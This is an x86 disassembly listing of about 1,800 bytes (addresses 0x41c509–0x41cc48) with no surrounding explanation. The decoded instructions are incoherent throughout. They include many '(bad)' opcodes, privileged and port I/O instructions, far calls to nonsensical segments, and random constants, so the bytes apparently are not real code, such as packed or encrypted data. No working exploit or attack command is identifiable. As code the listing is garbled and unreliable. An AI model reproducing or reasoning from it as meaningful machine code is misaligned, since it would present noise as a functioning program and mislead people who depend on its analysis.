  41c509:	lods   eax,DWORD PTR ds:[esi]
  41c50a:	cmp    DWORD PTR [esi],ebp
  41c50c:	mov    ecx,0xdb35499e
  41c511:	lahf   
  41c512:	call   0x8b6f:0xc7b9a0a0
  41c519:	push   esi
  41c51a:	outs   dx,DWORD PTR ds:[esi]
  41c51b:	shl    DWORD PTR [ebp-0x6145a959],0xb9
  41c522:	ss jno 0x41c564
  41c525:	in     eax,dx
  41c526:	scas   al,BYTE PTR es:[edi]
  41c527:	or     eax,0x61e06040
  41c52c:	push   0xeef79f49
  41c531:	mov    bl,0x61
  41c533:	sar    DWORD PTR [ebx+ebx*4+0x48],1
  41c537:	sbb    eax,0xf7176cce
  41c53c:	icebp  
  41c53d:	aam    0x65
  41c53f:	aaa    
  41c540:	mov    DWORD PTR [ebp+ecx*1-0x1bdcab48],ebx
  41c547:	dec    esp
  41c548:	jns    0x41c5bc
  41c54a:	aad    0x1
  41c54c:	and    BYTE PTR [ebp+0x5],ah
  41c54f:	add    BYTE PTR [esi-0x8af49dc],ah
  41c555:	fisttp DWORD PTR [ebx+edi*1+0x7e]
  41c559:	xor    esi,esi
  41c55b:	hlt    
  41c55c:	ja     0x41c57a
  41c55e:	cmp    ebx,DWORD PTR ds:0x59747219
  41c564:	or     al,0x72
  41c566:	lss    eax,FWORD PTR [eax-0x4b107863]
  41c56d:	dec    ebx
  41c56e:	test   eax,0xb091375f
  41c573:	dec    eax
  41c574:	rol    DWORD PTR [edx-0x3a330d70],cl
  41c57a:	ins    DWORD PTR es:[edi],dx
  41c57b:	aas    
  41c57c:	jg     0x41c53d
  41c57e:	push   ecx
  41c57f:	add    BYTE PTR [ebp+0x69],ch
  41c582:	rcl    ebx,0x2
  41c585:	mov    ebp,DWORD PTR [eax-0x5c]
  41c588:	aas    
  41c589:	ret    
  41c58a:	adc    BYTE PTR [edi+0x54],dl
  41c58d:	xor    dl,BYTE PTR [ecx]
  41c58f:	fiadd  WORD PTR [eax+0x3c]
  41c592:	jb     0x41c57c
  41c594:	shr    BYTE PTR [eax],1
  41c596:	adc    ebp,ebx
  41c598:	push   ebx
  41c599:	push   ebp
  41c59a:	loop   0x41c541
  41c59c:	out    dx,al
  41c59d:	dec    ebx
  41c59e:	push   cs
  41c59f:	mov    ecx,0xc8e5e613
  41c5a4:	or     al,0xce
  41c5a6:	into   
  41c5a7:	outs   dx,BYTE PTR ds:[esi]
  41c5a8:	push   edx
  41c5a9:	and    ah,0x8b
  41c5ac:	and    eax,0xb18954f5
  41c5b1:	adc    esp,DWORD PTR [ebx-0x296bac1]
  41c5b7:	mov    ch,BYTE PTR [ecx]
  41c5b9:	and    dl,BYTE PTR [ebp-0xecc6500]
  41c5bf:	fstp   TBYTE PTR [ecx+0x5441a169]
  41c5c5:	push   0xffffffad
  41c5c7:	adc    DWORD PTR [esi+0x607217d6],edx
  41c5cd:	xchg   edi,eax
  41c5ce:	ret    
  41c5cf:	scas   eax,DWORD PTR es:[edi]
  41c5d0:	mov    al,ds:0xb0cb436a
  41c5d5:	es (bad) 
  41c5d7:	jg     0x41c634
  41c5d9:	stc    
  41c5da:	stc    
  41c5db:	retf   0x10f
  41c5de:	or     BYTE PTR [ebp+0x99bfa48],bl
  41c5e4:	pop    edi
  41c5e5:	dec    esi
  41c5e6:	mov    ah,0x19
  41c5e8:	(bad)
  41c5ec:	ret    
  41c5ed:	cs aaa 
  41c5ef:	sub    BYTE PTR [eax-0x66b6dd56],0x9d
  41c5f6:	mov    ah,0x95
  41c5f8:	call   0xd8a1:0x451ef5ce
  41c5ff:	add    bh,BYTE PTR [edi]
  41c601:	add    BYTE PTR [ebx],0x8a
  41c604:	outs   dx,DWORD PTR ds:[esi]
  41c605:	push   esp
  41c606:	out    dx,al
  41c607:	dec    edx
  41c608:	fmul   DWORD PTR [ecx+0x1f996bbe]
  41c60e:	ds out 0xc1,eax
  41c611:	cli    
  41c612:	sahf   
  41c613:	aam    0xae
  41c615:	inc    ebx
  41c616:	fwait
  41c617:	xor    BYTE PTR [ecx-0x38],0x83
  41c61b:	sti    
  41c61c:	ins    DWORD PTR es:[edi],dx
  41c61d:	inc    ebx
  41c61e:	mov    dh,0xb1
  41c620:	inc    edi
  41c621:	xchg   edx,eax
  41c622:	popf   
  41c623:	pusha  
  41c624:	pop    ds
  41c625:	or     eax,0x4883e91a
  41c62a:	pop    esp
  41c62b:	or     al,0x30
  41c62d:	pop    ss
  41c62e:	mov    eax,ds:0x96629006
  41c633:	or     eax,0xf9d204c4
  41c638:	stos   DWORD PTR es:[edi],eax
  41c639:	les    esi,FWORD PTR [ecx]
  41c63b:	cmc    
  41c63c:	fwait
  41c63d:	ins    DWORD PTR es:[edi],dx
  41c63e:	jecxz  0x41c693
  41c640:	and    BYTE PTR [ecx+0x2a],ch
  41c643:	sbb    dl,BYTE PTR [edi]
  41c645:	je     0x41c61e
  41c647:	loopne 0x41c5d6
  41c649:	pushf  
  41c64a:	js     0x41c6b9
  41c64c:	lea    ebx,[edi]
  41c64e:	sar    DWORD PTR [esi-0x14b6ddf2],0x24
  41c655:	stos   DWORD PTR es:[edi],eax
  41c656:	in     al,0xd3
  41c658:	lods   al,BYTE PTR ds:[esi]
  41c659:	mov    bl,0x30
  41c65b:	pushf  
  41c65c:	popf   
  41c65d:	hlt    
  41c65e:	cmp    BYTE PTR [edi],dl
  41c660:	push   ss
  41c661:	jl     0x41c69e
  41c663:	out    dx,eax
  41c664:	xchg   esp,eax
  41c665:	scas   eax,DWORD PTR es:[edi]
  41c666:	mov    ds:0x8449e48f,eax
  41c66b:	xchg   BYTE PTR [edx+0x2ffbb406],bh
  41c671:	jg     0x41c6c6
  41c673:	inc    ecx
  41c674:	std    
  41c675:	jmp    0x64ed6dc6
  41c67a:	cmp    al,0x46
  41c67c:	jp     0x41c6e1
  41c67e:	xor    edx,edx
  41c680:	jecxz  0x41c632
  41c682:	dec    edi
  41c683:	adc    al,0x72
  41c685:	pusha  
  41c686:	mov    ecx,0x6176e1ec
  41c68b:	xor    al,0xff
  41c68d:	xchg   esi,eax
  41c68e:	xor    BYTE PTR [esi],ch
  41c690:	popa   
  41c691:	jecxz  0x41c614
  41c693:	shl    DWORD PTR ds:0xe36455c0,1
  41c699:	sub    DWORD PTR es:0xeb4b11d6,ebx
  41c6a0:	(bad)  
  41c6a1:	(bad)  
  41c6a2:	pop    edi
  41c6a3:	mov    ch,0xb7
  41c6a5:	daa    
  41c6a6:	shl    DWORD PTR [ecx*4-0x239224cd],0xbd
  41c6ae:	sub    esp,edi
  41c6b0:	xchg   esp,eax
  41c6b1:	mov    ebp,0x370b5baa
  41c6b6:	loopne 0x41c6f8
  41c6b8:	in     al,0x51
  41c6ba:	scas   eax,DWORD PTR es:[edi]
  41c6bb:	push   0x47
  41c6bd:	repz xchg ebx,eax
  41c6bf:	inc    edx
  41c6c0:	pop    ds
  41c6c1:	sub    DWORD PTR [esi],edx
  41c6c3:	mov    bh,BYTE PTR [ebx]
  41c6c5:	loope  0x41c664
  41c6c7:	sub    BYTE PTR [edi],bh
  41c6c9:	fwait
  41c6ca:	(bad)  
  41c6cb:	mov    edx,0x1e116113
  41c6d0:	sub    eax,0x19c276bf
  41c6d5:	rcl    DWORD PTR [eax+0x10],1
  41c6d8:	ins    BYTE PTR es:[edi],dx
  41c6d9:	mov    esi,DWORD PTR ds:0x1700ecf4
  41c6df:	neg    BYTE PTR [ebx]
  41c6e1:	int3   
  41c6e2:	(bad)  
  41c6e3:	and    eax,0x7a0045c0
  41c6e8:	mov    bh,0x49
  41c6ea:	dec    esp
  41c6eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6ec:	ret    
  41c6ed:	cmp    eax,0x12860d9
  41c6f2:	push   si
  41c6f4:	test   al,0x83
  41c6f6:	sbb    BYTE PTR [edi],cl
  41c6f8:	jge    0x41c6bb
  41c6fa:	stos   BYTE PTR es:[edi],al
  41c6fb:	lods   al,BYTE PTR ds:[esi]
  41c6fc:	mov    ds:0x388c6681,eax
  41c701:	ins    BYTE PTR es:[edi],dx
  41c702:	gs dec ebx
  41c704:	outs   dx,BYTE PTR ds:[esi]
  41c705:	jmp    0x410659b0
  41c70a:	dec    edx
  41c70b:	mul    ch
  41c70d:	rol    DWORD PTR [esi+0x13a188e3],cl
  41c713:	in     al,dx
  41c714:	popf   
  41c715:	pop    edi
  41c716:	je     0x41c714
  41c718:	mov    ?,WORD PTR [ebx]
  41c71a:	in     eax,dx
  41c71b:	inc    ebp
  41c71c:	aas    
  41c71d:	mov    al,0x7e
  41c71f:	lods   eax,DWORD PTR ds:[esi]
  41c720:	lods   eax,DWORD PTR ds:[esi]
  41c721:	pushf  
  41c722:	je     0x41c6ee
  41c724:	(bad)  
  41c725:	in     eax,0x20
  41c727:	dec    esp
  41c728:	daa    
  41c729:	(bad)  
  41c72a:	fmul   st(5),st
  41c72c:	repz test eax,0xfcf01cdb
  41c732:	addr16 mov al,0xbf
  41c735:	cmp    dh,BYTE PTR [ebp+0x7a]
  41c738:	mov    ds:0x42215ea9,eax
  41c73d:	cmp    esi,DWORD PTR [edx-0x3d]
  41c740:	unpckhps xmm3,xmm2
  41c743:	add    dl,ah
  41c745:	xchg   DWORD PTR [ecx-0x34],ebp
  41c748:	cwde   
  41c749:	pop    edi
  41c74a:	gs mov bh,0xff
  41c74d:	and    ah,BYTE PTR [ecx+0x17]
  41c750:	stc    
  41c751:	ins    BYTE PTR es:[edi],dx
  41c752:	xchg   esi,eax
  41c753:	xor    esi,DWORD PTR [esi-0x11]
  41c756:	push   esi
  41c757:	adc    eax,DWORD PTR [edx-0x5d]
  41c75a:	shl    BYTE PTR [esi],cl
  41c75c:	loop   0x41c757
  41c75e:	cmpxchg ah,cl
  41c761:	mov    bh,0xb4
  41c763:	fstp   QWORD PTR [eax+esi*1]
  41c766:	int    0x62
  41c768:	inc    esp
  41c769:	fidivr WORD PTR [ebx+0x6cb94507]
  41c76f:	daa    
  41c770:	ds int3 
  41c772:	scas   eax,DWORD PTR es:[edi]
  41c773:	popf   
  41c774:	(bad)  
  41c775:	sbb    BYTE PTR [edx+eiz*4-0x4],dl
  41c779:	fwait
  41c77a:	cdq    
  41c77b:	jmp    0x579a:0xb2ee8c50
  41c782:	or     BYTE PTR [ebx+0x47],dl
  41c785:	int3   
  41c786:	(bad)  
  41c787:	out    dx,eax
  41c788:	push   ebp
  41c789:	inc    edx
  41c78a:	dec    edi
  41c78b:	loopne 0x41c79f
  41c78d:	pop    ss
  41c78e:	inc    ebp
  41c78f:	(bad)  
  41c790:	push   esi
  41c791:	mov    eax,0xf8c3a9b9
  41c796:	inc    edi
  41c797:	call   0xbd28:0x337e8c1d
  41c79e:	ins    DWORD PTR es:[edi],dx
  41c79f:	in     al,0xc6
  41c7a1:	push   esi
  41c7a2:	adc    DWORD PTR [edx+0x1d],0xffffff9c
  41c7a6:	enter  0xeba,0xf4
  41c7aa:	mov    ch,0xc0
  41c7ac:	ficom  WORD PTR [eax+0x83a8494]
  41c7b2:	data16 fdivr st(0),st
  41c7b5:	mov    al,0xf3
  41c7b7:	cdq    
  41c7b8:	mov    edi,0x57ab5efd
  41c7bd:	and    eax,0x7f0eb893
  41c7c2:	mov    ecx,0x3f1204fb
  41c7c7:	dec    ebp
  41c7c8:	ds and eax,0xff07ed8d
  41c7ce:	shl    dl,cl
  41c7d0:	jne    0x41c808
  41c7d2:	cld    
  41c7d3:	int    0x91
  41c7d5:	dec    eax
  41c7d6:	and    ebp,DWORD PTR [edi-0x5c]
  41c7d9:	ficom  WORD PTR [edi-0x50]
  41c7dc:	dec    eax
  41c7dd:	daa    
  41c7de:	arpl   WORD PTR [eax],ax
  41c7e0:	jp     0x41c806
  41c7e2:	jge    0x41c775
  41c7e4:	pop    esi
  41c7e5:	inc    edx
  41c7e6:	arpl   WORD PTR [edi+0x43808f6],bp
  41c7ec:	rol    BYTE PTR [edx+0x3b],1
  41c7ef:	cmp    DWORD PTR [ecx-0x2f],eax
  41c7f2:	sbb    al,0xf1
  41c7f4:	rcr    esi,1
  41c7f6:	push   ds
  41c7f7:	mov    edx,fs
  41c7f9:	(bad)  
  41c7fa:	cmp    DWORD PTR [ecx+esi*4+0x583d4636],esi
  41c801:	cli    
  41c802:	cdq    
  41c803:	push   ebx
  41c804:	int    0x4e
  41c806:	push   ds
  41c807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c808:	xchg   BYTE PTR [edi],dl
  41c80a:	mov    edi,0xb06fdcbf
  41c80f:	jp     0x41c887
  41c811:	test   eax,0x3a8c4fd8
  41c816:	ret    
  41c817:	mov    ah,0x85
  41c819:	les    ecx,FWORD PTR [ebx+0x7bc92db5]
  41c81f:	push   edx
  41c820:	xchg   esi,eax
  41c821:	popa   
  41c822:	shl    DWORD PTR [ebx+0x53a2ec40],1
  41c828:	jmp    0x3a6c3777
  41c82d:	push   0x1b
  41c82f:	cmp    ecx,edx
  41c831:	xchg   edi,eax
  41c832:	fwait
  41c833:	mov    dh,0xeb
  41c835:	rcl    esi,1
  41c837:	inc    esp
  41c838:	cmp    DWORD PTR [esi+eiz*1-0x12],ecx
  41c83c:	mov    edx,0xd1a12c6e
  41c841:	jmp    0x3b0a:0x18c3eb5b
  41c848:	cs sub al,cl
  41c84b:	sub    BYTE PTR [ecx-0x67e046e9],ch
  41c851:	clc    
  41c852:	popa   
  41c853:	out    dx,eax
  41c854:	pop    esp
  41c855:	xor    esi,DWORD PTR [ecx+0x57f3c747]
  41c85b:	dec    esp
  41c85c:	mov    eax,cs:0x274fbf4
  41c862:	mov    dl,0x52
  41c864:	lahf   
  41c865:	sub    eax,0x96b093d3
  41c86a:	sub    BYTE PTR [esi],bh
  41c86c:	or     ebp,DWORD PTR [eax+0x58]
  41c86f:	stos   DWORD PTR es:[edi],eax
  41c870:	mov    edx,0x39dfd05d
  41c875:	lods   al,BYTE PTR ds:[esi]
  41c876:	mov    esi,0x7c1c238a
  41c87b:	clc    
  41c87c:	retf   0x621e
  41c87f:	es pop eax
  41c881:	fmulp  st(0),st
  41c883:	lahf   
  41c884:	xchg   esp,eax
  41c885:	xor    BYTE PTR [eax+0x7f90237a],dl
  41c88b:	shr    BYTE PTR ss:[edi],0x92
  41c88f:	jle    0x41c875
  41c891:	mov    bl,0x2b
  41c893:	popa   
  41c894:	retf   
  41c895:	xchg   ebp,eax
  41c896:	cwde   
  41c897:	or     BYTE PTR [ebp-0x10],bl
  41c89a:	ins    BYTE PTR es:[edi],dx
  41c89b:	and    dh,cl
  41c89d:	repnz int3 
  41c89f:	xchg   DWORD PTR [edx],edx
  41c8a1:	(bad)  
  41c8a2:	fstp   QWORD PTR [edx]
  41c8a4:	pop    edi
  41c8a5:	mov    BYTE PTR [edi+0x15],cl
  41c8a8:	lea    ebx,[ebp+ebp*1+0x6f1ab57e]
  41c8af:	test   BYTE PTR [ebx],0x70
  41c8b2:	stos   DWORD PTR es:[edi],eax
  41c8b3:	rol    edi,cl
  41c8b5:	mov    DWORD PTR [eax+0x2b],esi
  41c8b8:	inc    ecx
  41c8b9:	push   eax
  41c8ba:	cmc    
  41c8bb:	arpl   WORD PTR [ebx-0x61],cx
  41c8be:	jmp    0x86f62f4b
  41c8c3:	mul    dh
  41c8c5:	(bad)  
  41c8c7:	(bad)  
  41c8c8:	out    dx,eax
  41c8c9:	add    al,0x72
  41c8cb:	cs dec esi
  41c8cd:	scas   al,BYTE PTR es:[edi]
  41c8ce:	(bad)  
  41c8cf:	xchg   esp,eax
  41c8d0:	outs   dx,BYTE PTR ds:[esi]
  41c8d1:	mov    ds:0xcdb985ee,eax
  41c8d6:	sub    ebp,DWORD PTR [ebp+0x2a]
  41c8d9:	shr    ebp,cl
  41c8db:	cld    
  41c8dc:	fwait
  41c8dd:	mov    al,0x78
  41c8df:	and    BYTE PTR [eax-0x36],bl
  41c8e2:	mov    edx,0x2fdf14de
  41c8e7:	xchg   esp,eax
  41c8e8:	repnz mov eax,0x969c08a7
  41c8ee:	(bad)  
  41c8ef:	loopne 0x41c8c5
  41c8f1:	mov    BYTE PTR [ebp-0xa74dc86],cl
  41c8f7:	es push edi
  41c8f9:	pop    esp
  41c8fa:	and    cl,BYTE PTR [ebx-0x56]
  41c8fd:	fidivr WORD PTR ds:0x68b1f3d0
  41c903:	jb     0x41c89d
  41c905:	push   cs
  41c906:	sub    esp,ebx
  41c908:	cdq    
  41c909:	div    BYTE PTR [edi+0x6cfc56d0]
  41c90f:	dec    eax
  41c910:	dec    ebp
  41c911:	stc    
  41c912:	leave  
  41c913:	into   
  41c914:	dec    esp
  41c915:	cdq    
  41c916:	pop    ds
  41c917:	pop    es
  41c918:	or     eax,0x459b8054
  41c91d:	add    bl,BYTE PTR [eax-0x14360967]
  41c923:	xchg   edx,eax
  41c924:	push   0x5d
  41c926:	lahf   
  41c927:	inc    ebx
  41c928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c929:	icebp  
  41c92a:	pop    ss
  41c92b:	sub    al,0x92
  41c92d:	loopne 0x41c93e
  41c92f:	add    ecx,DWORD PTR ss:[eax]
  41c932:	bound  ebx,QWORD PTR [ebx]
  41c934:	lock ss jmp 0x41c9ab
  41c938:	sar    DWORD PTR [edx-0x7ddf675c],0xd6
  41c93f:	and    edi,edx
  41c941:	test   eax,0x3759a932
  41c946:	push   0x2b
  41c948:	jne    0x41c949
  41c94a:	inc    edi
  41c94b:	stc    
  41c94c:	enter  0x58ce,0xe5
  41c950:	ins    DWORD PTR es:[edi],dx
  41c951:	shl    DWORD PTR [ecx-0x73],cl
  41c954:	pop    es
  41c955:	cmp    BYTE PTR [ebx+0x2d],ch
  41c958:	mov    esp,0x8a2150db
  41c95d:	adc    edi,DWORD PTR ds:0x93f14929
  41c963:	mov    WORD PTR [ebx],?
  41c965:	adc    al,0x2
  41c967:	or     esp,DWORD PTR [ebx]
  41c969:	xor    ebx,DWORD PTR [esi-0x1af74be4]
  41c96f:	sar    BYTE PTR [ebx-0xa8dd2d5],0x85
  41c976:	jns    0x41c99c
  41c978:	lds    esp,FWORD PTR [ebx-0x79]
  41c97b:	or     al,0xb5
  41c97d:	jae    0x41c992
  41c97f:	adc    eax,0x46e514e1
  41c984:	dec    ecx
  41c985:	les    ecx,FWORD PTR [edi+eiz*4-0x40]
  41c989:	inc    ecx
  41c98a:	mov    bl,0xb1
  41c98c:	jmp    0xf3a5:0xb5d0a1ed
  41c993:	dec    eax
  41c994:	sbb    al,0x26
  41c996:	inc    edi
  41c997:	mov    dl,0x2f
  41c999:	mul    ecx
  41c99b:	inc    edx
  41c99c:	jae    0x41c94e
  41c99e:	inc    ebx
  41c99f:	mov    BYTE PTR [edx],bl
  41c9a1:	mov    eax,0xe5026766
  41c9a6:	shl    DWORD PTR [edi-0x5c],1
  41c9a9:	push   edi
  41c9aa:	lock add eax,0xb5d193c3
  41c9b0:	jbe    0x41c9e1
  41c9b2:	pusha  
  41c9b3:	xor    al,0x71
  41c9b5:	scas   eax,DWORD PTR es:[edi]
  41c9b6:	retf   
  41c9b7:	xor    dh,BYTE PTR [ebp+0x53]
  41c9ba:	lds    eax,FWORD PTR [ebp-0x1d]
  41c9bd:	loope  0x41c951
  41c9bf:	pop    ecx
  41c9c0:	xchg   esi,eax
  41c9c1:	or     bl,bh
  41c9c3:	jnp    0x41ca31
  41c9c5:	dec    ecx
  41c9c6:	push   edx
  41c9c7:	rcl    DWORD PTR [ebx],cl
  41c9c9:	inc    esi
  41c9ca:	dec    ebx
  41c9cb:	stos   BYTE PTR es:[edi],al
  41c9cc:	xor    ah,BYTE PTR [ebp-0x3c2cf4e]
  41c9d2:	dec    si
  41c9d4:	aaa    
  41c9d5:	push   edi
  41c9d6:	in     eax,0xe2
  41c9d8:	push   eax
  41c9d9:	std    
  41c9da:	mov    ch,0x40
  41c9dc:	cwde   
  41c9dd:	push   eax
  41c9de:	or     DWORD PTR [esi+eax*1+0x635c7730],0x5
  41c9e6:	xor    DWORD PTR [ecx-0x5e],0xe003628a
  41c9ed:	loope  0x41c98c
  41c9ef:	loopne 0x41ca08
  41c9f1:	fld    TBYTE PTR [edi]
  41c9f3:	add    eax,0x5194c74c
  41c9f8:	mov    bl,0xe6
  41c9fa:	jge    0x41ca62
  41c9fc:	mov    bl,0xd1
  41c9fe:	cmp    al,0x99
  41ca00:	sub    al,BYTE PTR ds:0xc40d6f9a
  41ca06:	mov    es,WORD PTR [esi-0x1]
  41ca09:	loopne 0x41c98f
  41ca0b:	adc    esp,DWORD PTR [edi-0x10ae55d8]
  41ca11:	adc    al,0xb8
  41ca13:	add    al,0x8e
  41ca15:	(bad)  
  41ca16:	mov    edx,0xb1add117
  41ca1b:	scas   al,BYTE PTR es:[edi]
  41ca1c:	xchg   esp,eax
  41ca1d:	stos   DWORD PTR es:[edi],eax
  41ca1e:	push   ebp
  41ca1f:	and    al,0x15
  41ca21:	retf   0xef34
  41ca24:	mov    ch,0xee
  41ca26:	outs   dx,BYTE PTR ds:[esi]
  41ca27:	out    0x2e,eax
  41ca29:	or     BYTE PTR [edx+0x41],ch
  41ca2c:	cmc    
  41ca2d:	push   cs
  41ca2e:	enter  0x1983,0x98
  41ca32:	call   0x34f5:0x95bf6013
  41ca39:	push   eax
  41ca3a:	pushf  
  41ca3b:	cmp    BYTE PTR [ecx],cl
  41ca3d:	pop    ecx
  41ca3e:	or     ebx,ebx
  41ca40:	push   eax
  41ca41:	xchg   ebp,eax
  41ca42:	lods   eax,DWORD PTR ds:[esi]
  41ca43:	je     0x41c9d6
  41ca45:	pop    ebp
  41ca46:	(bad)  
  41ca47:	icebp  
  41ca48:	or     DWORD PTR [ebx-0x748a5b4],edi
  41ca4e:	std    
  41ca4f:	sub    BYTE PTR [edx-0x1faa4b88],dh
  41ca55:	or     DWORD PTR [ebx],edx
  41ca57:	mov    esi,DWORD PTR [esi]
  41ca59:	cwde   
  41ca5a:	aaa    
  41ca5b:	and    ch,BYTE PTR [ecx+0x64]
  41ca5e:	(bad)  
  41ca5f:	mov    WORD PTR [ebx],?
  41ca61:	push   cs
  41ca62:	mov    dh,0x87
  41ca64:	inc    edx
  41ca65:	adc    ah,BYTE PTR [ebx+0x59]
  41ca68:	mov    cl,0x55
  41ca6a:	das    
  41ca6b:	hlt    
  41ca6c:	ds and bl,dl
  41ca6f:	aam    0xdf
  41ca71:	lods   al,BYTE PTR ds:[esi]
  41ca72:	imul   edx,DWORD PTR [ebp-0x40],0xffffff98
  41ca76:	and    eax,0xca85d3ff
  41ca7b:	sub    eax,0xb93906ab
  41ca80:	lods   eax,DWORD PTR ds:[esi]
  41ca81:	fbld   TBYTE PTR ds:0x52843e4d
  41ca87:	mov    DWORD PTR [ecx-0x6034c674],edx
  41ca8d:	xchg   esp,eax
  41ca8e:	cmp    DWORD PTR [edi+0x78],0xb80caa29
  41ca95:	gs adc eax,0xfb29a6fd
  41ca9b:	cmp    BYTE PTR [edx-0x2f],ch
  41ca9e:	and    al,0x83
  41caa0:	das    
  41caa1:	scas   eax,DWORD PTR es:[edi]
  41caa2:	mov    ebp,0xeea68913
  41caa7:	test   esi,esp
  41caa9:	xchg   ebx,eax
  41caaa:	mov    al,ds:0xc5c7a69e
  41caaf:	mov    dl,0xc1
  41cab1:	dec    eax
  41cab2:	sub    dh,BYTE PTR [edi+0x52]
  41cab5:	xchg   ecx,eax
  41cab6:	sub    al,0x4d
  41cab8:	push   0x9d70021b
  41cabd:	pop    eax
  41cabe:	outs   dx,DWORD PTR ds:[esi]
  41cabf:	mov    DWORD PTR [ebx+ebx*2],0xcdbef662
  41cac6:	jbe    0x41cabd
  41cac8:	rol    BYTE PTR [esi],0x20
  41cacb:	ret    0x1eb2
  41cace:	push   esp
  41cacf:	das    
  41cad0:	out    dx,al
  41cad1:	rcl    BYTE PTR [eax],cl
  41cad3:	adc    eax,0x11752010
  41cad8:	retf   
  41cad9:	std    
  41cada:	sub    eax,0x6f798f26
  41cadf:	ss mov dl,0xca
  41cae2:	dec    eax
  41cae3:	sub    DWORD PTR [edx-0x6e21aa03],0xd2af697b
  41caed:	pop    ss
  41caee:	push   ss
  41caef:	xchg   BYTE PTR [ebx-0x65],bh
  41caf2:	fidiv  DWORD PTR [esi-0x6b]
  41caf5:	mov    bh,0xe9
  41caf7:	jle    0x41cad6
  41caf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cafa:	stos   DWORD PTR es:[edi],eax
  41cafb:	pop    ebp
  41cafc:	dec    eax
  41cafd:	push   cs
  41cafe:	jns    0x41caa1
  41cb00:	inc    esi
  41cb01:	mov    al,0x10
  41cb03:	or     al,0xfd
  41cb05:	aad    0xe5
  41cb07:	rol    BYTE PTR [ecx],cl
  41cb09:	sbb    al,0x96
  41cb0b:	cmp    DWORD PTR [esi],ebp
  41cb0d:	sub    BYTE PTR ds:0xeab3edb4,ch
  41cb13:	in     eax,dx
  41cb14:	mov    ebx,0xe7c2e723
  41cb19:	sar    BYTE PTR [ebx-0x6e],1
  41cb1c:	pop    ebx
  41cb1d:	in     al,dx
  41cb1e:	pop    ds
  41cb1f:	jecxz  0x41cb71
  41cb21:	inc    ebp
  41cb22:	fimul  DWORD PTR [esi]
  41cb24:	adc    cl,ch
  41cb26:	xchg   ecx,eax
  41cb27:	xchg   ebp,eax
  41cb28:	xchg   eax,ebx
  41cb2a:	mov    ds:0x8978ade8,al
  41cb2f:	adc    eax,0xc2b2fe0d
  41cb34:	xchg   ebx,eax
  41cb35:	call   0xf95:0x8896a5d7
  41cb3c:	das    
  41cb3d:	shr    BYTE PTR [ebx+eiz*1-0x26b0b524],1
  41cb44:	icebp  
  41cb45:	fmul   QWORD PTR [ebx+0x20]
  41cb48:	(bad)  
  41cb49:	stc    
  41cb4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb4b:	jecxz  0x41cb76
  41cb4d:	xor    BYTE PTR [edi+ebp*8+0x6a],cl
  41cb51:	call   0x120fd5f2
  41cb56:	loopne 0x41cb45
  41cb58:	push   eax
  41cb59:	add    esi,ebx
  41cb5b:	test   BYTE PTR [ebx+0x60decb76],ch
  41cb61:	(bad)  [esi]
  41cb63:	sar    esi,0x5d
  41cb66:	les    esi,FWORD PTR [esi-0x64]
  41cb69:	mov    ds:0x6fc3370a,al
  41cb6e:	adc    DWORD PTR ds:0x8ba2a4a9,esp
  41cb74:	loop   0x41cb91
  41cb76:	cmp    bl,bl
  41cb78:	es sub ecx,ecx
  41cb7b:	ja     0x41cbc9
  41cb7d:	int3   
  41cb7e:	xor    ecx,DWORD PTR ds:0x253f5e05
  41cb84:	popa   
  41cb85:	push   ebx
  41cb86:	push   eax
  41cb87:	fmul   QWORD PTR [ecx-0x4a]
  41cb8a:	test   BYTE PTR [edx],bh
  41cb8c:	cmp    eax,0x4f9179e3
  41cb91:	leave  
  41cb92:	mov    ds,WORD PTR [eax+0x11]
  41cb95:	js     0x41cb98
  41cb97:	or     al,0xd5
  41cb99:	test   BYTE PTR [ecx],cl
  41cb9b:	rcr    DWORD PTR [ebx-0x68],cl
  41cb9e:	pop    ss
  41cb9f:	test   eax,0x39cdeac9
  41cba4:	pop    ebx
  41cba5:	scas   eax,DWORD PTR es:[edi]
  41cba6:	or     BYTE PTR [ecx],0x38
  41cba9:	pusha  
  41cbaa:	enter  0x8dfa,0xd2
  41cbae:	jp     0x41cbe3
  41cbb0:	sub    cl,cl
  41cbb2:	cmp    eax,esp
  41cbb4:	mov    DWORD PTR [edi+0x72b7477b],esp
  41cbba:	jb     0x41cc1e
  41cbbc:	adc    ah,BYTE PTR [ebx]
  41cbbe:	aam    0x3b
  41cbc0:	(bad)  
  41cbc1:	cmp    al,0x91
  41cbc3:	or     bh,BYTE PTR [ebx]
  41cbc5:	jg     0x41cbe3
  41cbc7:	iret   
  41cbc8:	and    eax,0xdb9cd15a
  41cbcd:	or     BYTE PTR [edx+0x7f832976],ch
  41cbd3:	pop    es
  41cbd4:	arpl   WORD PTR [eax],bp
  41cbd6:	cmp    edi,edi
  41cbd8:	push   0x90d2ad9e
  41cbdd:	sahf   
  41cbde:	jmp    0x9450:0x161edb8a
  41cbe5:	sub    eax,0xfd428cc4
  41cbea:	mov    esp,0x3c7f6017
  41cbef:	test   eax,0x660d8210
  41cbf4:	ret    
  41cbf5:	pop    ecx
  41cbf6:	sti    
  41cbf7:	repz inc ebp
  41cbf9:	add    al,0x39
  41cbfb:	mov    eax,ecx
  41cbfd:	pop    es
  41cbfe:	mov    eax,0x3298993
  41cc03:	pop    esp
  41cc04:	add    ebx,DWORD PTR [edi-0x5a1e2582]
  41cc0a:	inc    edx
  41cc0b:	cdq    
  41cc0c:	fiadd  DWORD PTR [ebp+0x31fd1aa4]
  41cc12:	jl     0x41cbcb
  41cc14:	push   edi
  41cc15:	in     eax,0x2f
  41cc17:	ja     0x41cc8d
  41cc19:	inc    edx
  41cc1a:	fdivp  st(2),st
  41cc1c:	rcl    DWORD PTR [edx+0x5b],0x43
  41cc20:	pop    es
  41cc21:	hlt    
  41cc22:	outs   dx,BYTE PTR ds:[esi]
  41cc23:	xor    eax,0xffffff8e
  41cc26:	cmp    BYTE PTR [edx+0x548fcca2],al
  41cc2c:	mov    bh,0x4c
  41cc2e:	shr    BYTE PTR [ecx],0xbc
  41cc31:	std    
  41cc32:	xor    DWORD PTR [edx],0xffffffaf
  41cc35:	push   esp
  41cc36:	dec    ebp
  41cc37:	xchg   ecx,eax
  41cc38:	sbb    eax,0xf621536a
  41cc3d:	push   ebx
  41cc3e:	push   ebp
  41cc3f:	icebp  
  41cc40:	sbb    eax,0x89606a7b
  41cc45:	dec    ebx
  41cc46:	cmp    al,0xc6
  41cc48:	mov    dh,0xa2
